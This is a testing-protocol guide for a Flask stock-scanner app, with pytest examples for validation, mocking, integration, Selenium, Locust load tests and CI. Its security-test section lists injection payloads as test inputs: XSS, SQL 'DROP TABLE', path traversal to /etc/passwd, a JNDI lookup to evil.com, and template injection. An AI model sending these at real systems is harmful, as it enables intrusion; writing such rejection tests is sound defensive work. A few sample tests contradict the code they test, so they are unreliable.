# Testing Protocol - Stock Scanner Bot

**Comprehensive Testing Strategy for All Code Changes**

---

## Testing Philosophy

> "Untested code is broken code. Well-tested code is maintainable code."

**Core Principles:**
1. Test behavior, not implementation
2. Tests should be fast, isolated, and deterministic
3. Write tests BEFORE fixing bugs (TDD for bugs)
4. Aim for 80%+ coverage, 100% for critical paths
5. Tests are documentation - make them readable

---

## Table of Contents

1. [Test Levels](#test-levels)
2. [Unit Testing](#unit-testing)
3. [Integration Testing](#integration-testing)
4. [End-to-End Testing](#end-to-end-testing)
5. [Performance Testing](#performance-testing)
6. [Security Testing](#security-testing)
7. [Test Data Management](#test-data-management)
8. [Continuous Testing](#continuous-testing)

---

## Test Levels

### Pyramid Structure (Bottom to Top)

```
         /\
        /E2E\          10% - End-to-End (Slow, Brittle, High Value)
       /------\
      /  INT   \       20% - Integration (Medium Speed, Medium Value)
     /----------\
    /   UNIT     \     70% - Unit Tests (Fast, Stable, Foundation)
   /--------------\
```

**Distribution:**
- **70% Unit Tests** - Fast, isolated, test individual functions
- **20% Integration Tests** - Test components working together
- **10% E2E Tests** - Test complete user workflows

---

## Unit Testing

### What to Unit Test

**Test ALL of these:**
- [ ] Business logic functions
- [ ] Validation functions
- [ ] Calculation/algorithm functions
- [ ] Data transformation functions
- [ ] Utility/helper functions

**DON'T unit test:**
- Simple getters/setters
- Framework code (Django, Flask internals)
- External libraries (trust they're tested)

### Unit Test Structure (AAA Pattern)

```python
def test_function_name():
    """Test description in plain English."""
    # Arrange - Set up test data
    ticker = "AAPL"
    expected = "AAPL"

    # Act - Execute the function
    result = validate_ticker(ticker)

    # Assert - Verify the result
    assert result == expected
```

### Test Naming Convention

**Format:** `test_<function>_<scenario>_<expected_result>`

```python
# GOOD names (descriptive, clear intent)
def test_validate_ticker_with_lowercase_returns_uppercase():
    assert validate_ticker("aapl") == "AAPL"

def test_validate_ticker_with_empty_string_raises_value_error():
    with pytest.raises(ValueError):
        validate_ticker("")

def test_calculate_pnl_with_profit_returns_positive_value():
    pnl = calculate_pnl(buy_price=100, sell_price=150, shares=10)
    assert pnl == 500

# BAD names (vague, unclear)
def test_ticker():  # What about ticker?
    pass

def test_case_1():  # What is case 1?
    pass

def test_works():  # What works?
    pass
```

### Test Coverage Matrix

For each function, create tests covering:

| Scenario | Description | Example |
|----------|-------------|---------|
| **Happy Path** | Normal, expected input | `validate_ticker("AAPL")` |
| **Edge Cases** | Boundary values | `validate_ticker("A")` (min), `validate_ticker("ABCDE")` (max) |
| **Error Cases** | Invalid input | `validate_ticker("")`, `validate_ticker("TOOLONG")` |
| **Null/Empty** | Missing data | `validate_ticker(None)`, `validate_ticker("")` |
| **Special Chars** | Unusual input | `validate_ticker("A@PL")`, `validate_ticker("12345")` |

### Unit Test Examples

#### Example 1: Validation Function

```python
# Function to test
def validate_ticker(ticker: str) -> str:
    """Validate and normalize ticker symbol."""
    if not ticker or not ticker.strip():
        raise ValueError("Ticker cannot be empty")

    ticker = ticker.strip().upper()

    if len(ticker) > 5:
        raise ValueError("Ticker too long (max 5 characters)")

    if not ticker.isalnum():
        raise ValueError("Ticker must be alphanumeric")

    return ticker


# Test suite
class TestValidateTicker:
    """Tests for ticker validation."""

    def test_valid_ticker_uppercase(self):
        """Valid uppercase ticker is returned unchanged."""
        assert validate_ticker("AAPL") == "AAPL"

    def test_valid_ticker_lowercase_converted_to_uppercase(self):
        """Lowercase ticker is converted to uppercase."""
        assert validate_ticker("aapl") == "AAPL"

    def test_valid_ticker_with_whitespace_is_trimmed(self):
        """Whitespace is trimmed from ticker."""
        assert validate_ticker("  GOOGL  ") == "GOOGL"

    def test_single_character_ticker_is_valid(self):
        """Single character ticker is accepted."""
        assert validate_ticker("A") == "A"

    def test_five_character_ticker_is_valid(self):
        """Five character ticker (max length) is accepted."""
        assert validate_ticker("ABCDE") == "ABCDE"

    def test_empty_string_raises_value_error(self):
        """Empty string raises ValueError."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_ticker("")

    def test_whitespace_only_raises_value_error(self):
        """Whitespace-only string raises ValueError."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_ticker("   ")

    def test_none_raises_attribute_error(self):
        """None raises AttributeError."""
        with pytest.raises(AttributeError):
            validate_ticker(None)

    def test_ticker_too_long_raises_value_error(self):
        """Ticker longer than 5 characters raises ValueError."""
        with pytest.raises(ValueError, match="too long"):
            validate_ticker("TOOLONG")

    def test_ticker_with_special_characters_raises_value_error(self):
        """Ticker with special characters raises ValueError."""
        with pytest.raises(ValueError, match="alphanumeric"):
            validate_ticker("A@PL")

    def test_ticker_with_spaces_raises_value_error(self):
        """Ticker with internal spaces raises ValueError."""
        with pytest.raises(ValueError, match="alphanumeric"):
            validate_ticker("A PL")
```

#### Example 2: Calculation Function

```python
# Function to test
def calculate_pnl(buy_price: float, sell_price: float, shares: int) -> float:
    """Calculate profit/loss for a trade."""
    if shares <= 0:
        raise ValueError("Shares must be positive")

    if buy_price <= 0 or sell_price < 0:
        raise ValueError("Prices must be non-negative")

    return (sell_price - buy_price) * shares


# Test suite
class TestCalculatePnL:
    """Tests for P&L calculation."""

    def test_profit_calculated_correctly(self):
        """Profit is calculated correctly."""
        # Buy at $100, sell at $150, 10 shares = $500 profit
        assert calculate_pnl(100, 150, 10) == 500

    def test_loss_calculated_correctly(self):
        """Loss is calculated correctly."""
        # Buy at $150, sell at $100, 10 shares = -$500 loss
        assert calculate_pnl(150, 100, 10) == -500

    def test_breakeven_returns_zero(self):
        """Break-even trade returns zero."""
        assert calculate_pnl(100, 100, 10) == 0

    def test_fractional_shares(self):
        """Fractional shares work correctly."""
        # Buy at $100, sell at $110, 0.5 shares = $5 profit
        assert calculate_pnl(100, 110, 0.5) == 5

    def test_penny_stock_precision(self):
        """Small price differences calculated precisely."""
        # Buy at $0.01, sell at $0.02, 1000 shares = $10 profit
        assert calculate_pnl(0.01, 0.02, 1000) == pytest.approx(10, rel=1e-9)

    def test_zero_shares_raises_value_error(self):
        """Zero shares raises ValueError."""
        with pytest.raises(ValueError, match="positive"):
            calculate_pnl(100, 150, 0)

    def test_negative_shares_raises_value_error(self):
        """Negative shares raises ValueError."""
        with pytest.raises(ValueError, match="positive"):
            calculate_pnl(100, 150, -10)

    def test_zero_buy_price_raises_value_error(self):
        """Zero buy price raises ValueError."""
        with pytest.raises(ValueError, match="non-negative"):
            calculate_pnl(0, 150, 10)

    def test_negative_sell_price_raises_value_error(self):
        """Negative sell price raises ValueError."""
        with pytest.raises(ValueError, match="non-negative"):
            calculate_pnl(100, -50, 10)
```

#### Example 3: Testing with Mocks

```python
from unittest.mock import Mock, patch

# Function to test
def get_stock_price(ticker: str) -> Optional[float]:
    """Fetch current stock price from Polygon API."""
    try:
        response = requests.get(
            f"https://api.polygon.io/v2/aggs/ticker/{ticker}/prev",
            params={"apiKey": os.getenv("POLYGON_API_KEY")},
            timeout=5
        )
        response.raise_for_status()
        data = response.json()
        return data['results'][0]['c']
    except Exception as e:
        logger.error(f"Failed to fetch price for {ticker}: {e}")
        return None


# Test suite
class TestGetStockPrice:
    """Tests for stock price fetching."""

    @patch('requests.get')
    def test_successful_price_fetch(self, mock_get):
        """Successful API call returns price."""
        # Mock successful response
        mock_response = Mock()
        mock_response.json.return_value = {
            'results': [{'c': 150.25}]
        }
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        price = get_stock_price("AAPL")

        assert price == 150.25
        mock_get.assert_called_once()

    @patch('requests.get')
    def test_api_timeout_returns_none(self, mock_get):
        """API timeout returns None."""
        mock_get.side_effect = requests.exceptions.Timeout()

        price = get_stock_price("AAPL")

        assert price is None

    @patch('requests.get')
    def test_api_error_returns_none(self, mock_get):
        """API error returns None."""
        mock_get.side_effect = requests.exceptions.RequestException("API Error")

        price = get_stock_price("AAPL")

        assert price is None

    @patch('requests.get')
    def test_invalid_json_returns_none(self, mock_get):
        """Invalid JSON response returns None."""
        mock_response = Mock()
        mock_response.json.side_effect = ValueError("Invalid JSON")
        mock_get.return_value = mock_response

        price = get_stock_price("AAPL")

        assert price is None

    @patch('requests.get')
    def test_missing_price_in_response_returns_none(self, mock_get):
        """Response missing price data returns None."""
        mock_response = Mock()
        mock_response.json.return_value = {'results': []}
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        price = get_stock_price("AAPL")

        assert price is None
```

### Parametrized Tests (Testing Multiple Cases)

```python
@pytest.mark.parametrize("ticker,expected", [
    ("AAPL", "AAPL"),
    ("aapl", "AAPL"),
    ("  googl  ", "GOOGL"),
    ("MSFT", "MSFT"),
    ("a", "A"),
])
def test_validate_ticker_various_formats(ticker, expected):
    """Test ticker validation with various valid formats."""
    assert validate_ticker(ticker) == expected


@pytest.mark.parametrize("invalid_ticker,error_message", [
    ("", "cannot be empty"),
    ("   ", "cannot be empty"),
    ("TOOLONG", "too long"),
    ("A@PL", "alphanumeric"),
    ("12345", "alphanumeric"),
])
def test_validate_ticker_invalid_inputs(invalid_ticker, error_message):
    """Test ticker validation rejects invalid inputs."""
    with pytest.raises(ValueError, match=error_message):
        validate_ticker(invalid_ticker)
```

---

## Integration Testing

### What to Integration Test

**Test interactions between:**
- [ ] API endpoints and database
- [ ] API endpoints and external services
- [ ] Multiple modules working together
- [ ] Authentication flow
- [ ] Full request/response cycle

### Integration Test Setup

```python
import pytest
from flask import Flask
from src.api.app import app
from src.database import db

@pytest.fixture
def client():
    """Test client with temporary database."""
    app.config['TESTING'] = True
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'

    with app.test_client() as client:
        with app.app_context():
            db.create_all()
            yield client
            db.drop_all()


@pytest.fixture
def auth_headers():
    """Authentication headers for protected endpoints."""
    return {'Authorization': 'Bearer test-token-123'}
```

### Integration Test Examples

#### Example 1: API Endpoint Test

```python
def test_get_scan_results(client):
    """Test GET /api/scan returns scan results."""
    # Arrange - Add test data
    # (In real test, would insert via ORM or test fixtures)

    # Act
    response = client.get('/api/scan')

    # Assert
    assert response.status_code == 200

    data = response.json
    assert data['ok'] is True
    assert 'stocks' in data
    assert 'total' in data
    assert isinstance(data['stocks'], list)


def test_trigger_scan(client, auth_headers):
    """Test POST /api/scan/trigger starts a scan."""
    # Act
    response = client.post(
        '/api/scan/trigger?mode=quick',
        headers=auth_headers
    )

    # Assert
    assert response.status_code == 202

    data = response.json
    assert data['status'] == 'started'
    assert data['mode'] == 'quick'
    assert data['universe_size'] > 0


def test_trigger_scan_unauthorized(client):
    """Test POST /api/scan/trigger requires authentication."""
    response = client.post('/api/scan/trigger?mode=quick')

    assert response.status_code == 401
```

#### Example 2: Database Integration Test

```python
def test_create_trade_persists_to_database(client):
    """Test creating a trade saves to database."""
    # Arrange
    trade_data = {
        'ticker': 'AAPL',
        'shares': 100,
        'price': 150.50,
        'action': 'buy'
    }

    # Act
    response = client.post('/api/trades/create', json=trade_data)

    # Assert
    assert response.status_code == 201

    # Verify in database
    from src.models import Trade
    trade = Trade.query.filter_by(ticker='AAPL').first()

    assert trade is not None
    assert trade.shares == 100
    assert trade.price == 150.50
    assert trade.action == 'buy'


def test_delete_trade_removes_from_database(client):
    """Test deleting a trade removes from database."""
    # Arrange - Create a trade first
    from src.models import Trade
    trade = Trade(ticker='AAPL', shares=100, price=150, action='buy')
    db.session.add(trade)
    db.session.commit()
    trade_id = trade.id

    # Act
    response = client.delete(f'/api/trades/{trade_id}')

    # Assert
    assert response.status_code == 200

    # Verify deleted
    deleted_trade = Trade.query.get(trade_id)
    assert deleted_trade is None
```

#### Example 3: External API Integration Test

```python
@pytest.mark.integration
@pytest.mark.slow
def test_polygon_api_real_call():
    """Test real call to Polygon API (slow, requires API key)."""
    # Skip if no API key
    if not os.getenv('POLYGON_API_KEY'):
        pytest.skip("No Polygon API key configured")

    # Act
    price = get_stock_price("AAPL")

    # Assert
    assert price is not None
    assert isinstance(price, float)
    assert price > 0
    assert price < 1000  # Sanity check


@pytest.mark.integration
def test_polygon_api_invalid_ticker():
    """Test Polygon API handles invalid ticker gracefully."""
    price = get_stock_price("INVALIDTICKER999")

    assert price is None
```

---

## End-to-End Testing

### E2E Test Structure

**Tools:** Selenium, Playwright, or Cypress for browser automation

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

@pytest.fixture
def browser():
    """Selenium browser for E2E tests."""
    driver = webdriver.Chrome()
    driver.implicitly_wait(10)
    yield driver
    driver.quit()


def test_complete_scan_workflow(browser):
    """Test complete scan workflow from UI."""
    # Navigate to dashboard
    browser.get("https://stock-story-jy89o.ondigitalocean.app/")

    # Wait for page load
    WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.ID, "scan-tab"))
    )

    # Click scan button
    scan_button = browser.find_element(By.ID, "trigger-scan-quick")
    scan_button.click()

    # Wait for scan to complete
    WebDriverWait(browser, 60).until(
        EC.text_to_be_present_in_element(
            (By.ID, "scan-results"),
            "stocks found"
        )
    )

    # Verify results displayed
    results = browser.find_element(By.ID, "scan-results")
    assert "stocks found" in results.text


def test_add_trade_workflow(browser):
    """Test adding a trade through UI."""
    browser.get("https://stock-story-jy89o.ondigitalocean.app/")

    # Click "Add Trade" button
    add_trade_btn = browser.find_element(By.ID, "add-trade-btn")
    add_trade_btn.click()

    # Fill form
    browser.find_element(By.ID, "ticker-input").send_keys("AAPL")
    browser.find_element(By.ID, "shares-input").send_keys("100")
    browser.find_element(By.ID, "price-input").send_keys("150.50")

    # Submit
    browser.find_element(By.ID, "submit-trade").click()

    # Verify trade appears in list
    WebDriverWait(browser, 10).until(
        EC.text_to_be_present_in_element(
            (By.CLASS_NAME, "trade-list"),
            "AAPL"
        )
    )
```

---

## Performance Testing

### Load Testing with Locust

```python
from locust import HttpUser, task, between

class DashboardUser(HttpUser):
    """Simulate dashboard user behavior."""
    wait_time = between(1, 3)  # Wait 1-3 seconds between tasks

    @task(3)  # Weight 3 - most common action
    def view_scan_results(self):
        """Get scan results."""
        self.client.get("/api/scan")

    @task(2)  # Weight 2
    def view_ticker(self):
        """View individual ticker."""
        tickers = ["AAPL", "GOOGL", "MSFT", "NVDA", "TSLA"]
        ticker = random.choice(tickers)
        self.client.get(f"/api/ticker/{ticker}")

    @task(1)  # Weight 1 - less common
    def trigger_scan(self):
        """Trigger new scan."""
        self.client.post("/api/scan/trigger?mode=quick")

    def on_start(self):
        """Called when user starts."""
        # Login or setup
        pass
```

**Run load test:**
```bash
# Test with 100 concurrent users, spawning 10/second
locust -f tests/performance/locustfile.py \
    --host https://stock-story-jy89o.ondigitalocean.app \
    --users 100 \
    --spawn-rate 10 \
    --run-time 5m
```

### Performance Benchmarks

```python
def test_scan_performance_benchmark(benchmark):
    """Benchmark scan performance."""
    tickers = ["AAPL", "GOOGL", "MSFT"] * 10  # 30 tickers

    result = benchmark(run_scan, tickers)

    assert len(result) == 30
    # Benchmark plugin automatically reports timing


def test_database_query_performance(benchmark, test_db):
    """Benchmark database query performance."""
    # Insert 1000 test records
    for i in range(1000):
        db.session.add(Trade(ticker=f"TEST{i}", shares=100, price=100))
    db.session.commit()

    # Benchmark query
    def query():
        return Trade.query.filter_by(ticker="TEST500").first()

    result = benchmark(query)

    assert result is not None
    # Should complete in < 10ms with proper indexing
```

---

## Security Testing

### Input Validation Tests

```python
@pytest.mark.security
@pytest.mark.parametrize("malicious_input", [
    "<script>alert('xss')</script>",
    "'; DROP TABLE trades; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",  # Template injection
])
def test_ticker_input_sanitized(client, malicious_input):
    """Test malicious input is sanitized."""
    response = client.post(
        '/api/trades/create',
        json={'ticker': malicious_input, 'shares': 100, 'price': 100}
    )

    # Should reject invalid input
    assert response.status_code == 400
    assert 'error' in response.json
```

### Authentication Tests

```python
def test_protected_endpoint_requires_auth(client):
    """Test protected endpoint rejects unauthenticated requests."""
    response = client.post('/api/scan/trigger')

    assert response.status_code == 401


def test_invalid_token_rejected(client):
    """Test invalid auth token is rejected."""
    response = client.post(
        '/api/scan/trigger',
        headers={'Authorization': 'Bearer invalid-token'}
    )

    assert response.status_code == 401


def test_expired_token_rejected(client):
    """Test expired token is rejected."""
    # Create expired token
    expired_token = create_test_token(expired=True)

    response = client.post(
        '/api/scan/trigger',
        headers={'Authorization': f'Bearer {expired_token}'}
    )

    assert response.status_code == 401
```

---

## Test Data Management

### Fixtures for Common Test Data

```python
@pytest.fixture
def sample_tickers():
    """Common ticker symbols for testing."""
    return ["AAPL", "GOOGL", "MSFT", "NVDA", "TSLA"]


@pytest.fixture
def sample_trade():
    """Sample trade for testing."""
    return {
        'ticker': 'AAPL',
        'shares': 100,
        'price': 150.50,
        'action': 'buy',
        'date': '2024-01-15'
    }


@pytest.fixture
def mock_stock_data():
    """Mock stock data from Polygon API."""
    return {
        'ticker': 'AAPL',
        'name': 'Apple Inc.',
        'price': 150.25,
        'market_cap': 2500000000000,
        'sector': 'Technology'
    }
```

### Factory Pattern for Test Data

```python
class TradeFactory:
    """Factory for creating test trades."""

    @staticmethod
    def create(**kwargs):
        """Create a trade with default values."""
        defaults = {
            'ticker': 'AAPL',
            'shares': 100,
            'price': 150.0,
            'action': 'buy',
            'date': datetime.now()
        }
        defaults.update(kwargs)
        return Trade(**defaults)


# Usage in tests
def test_pnl_calculation():
    """Test P&L calculation."""
    buy_trade = TradeFactory.create(price=100, action='buy')
    sell_trade = TradeFactory.create(price=150, action='sell')

    pnl = calculate_pnl(buy_trade, sell_trade)
    assert pnl == 5000  # 100 shares * $50 profit
```

---

## Continuous Testing

### Pre-Commit Hooks

```bash
# .git/hooks/pre-commit
#!/bin/bash

echo "Running tests before commit..."

# Run unit tests
pytest tests/unit/ -q

if [ $? -ne 0 ]; then
    echo "❌ Unit tests failed. Commit aborted."
    exit 1
fi

# Run linting
python -m flake8 src/

if [ $? -ne 0 ]; then
    echo "❌ Linting failed. Commit aborted."
    exit 1
fi

echo "✅ All checks passed. Proceeding with commit."
```

### CI/CD Pipeline

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v2

      - name: Set up Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pytest pytest-cov flake8

      - name: Run linting
        run: flake8 src/

      - name: Run unit tests
        run: pytest tests/unit/ -v --cov=src --cov-report=xml

      - name: Run integration tests
        run: pytest tests/integration/ -v

      - name: Upload coverage
        uses: codecov/codecov-action@v2
        with:
          files: ./coverage.xml
```

---

## Quick Reference

### Running Tests

```bash
# Run all tests
pytest

# Run specific test file
pytest tests/test_scanner.py

# Run specific test
pytest tests/test_scanner.py::test_validate_ticker

# Run with coverage
pytest --cov=src --cov-report=html

# Run only fast tests
pytest -m "not slow"

# Run only integration tests
pytest -m integration

# Run with verbose output
pytest -v

# Run and show print statements
pytest -s

# Run last failed tests
pytest --lf

# Run in parallel
pytest -n 4  # 4 parallel workers
```

### Test Markers

```python
@pytest.mark.slow  # Slow test (> 1 second)
@pytest.mark.integration  # Integration test
@pytest.mark.security  # Security test
@pytest.mark.skip  # Skip this test
@pytest.mark.skipif(condition, reason="...")  # Conditional skip
@pytest.mark.xfail  # Expected to fail
@pytest.mark.parametrize  # Run with multiple parameters
```

---

**Last Updated:** 2026-01-30
**Maintained By:** Claude Sonnet 4.5
**Review Frequency:** Update when new testing patterns emerge
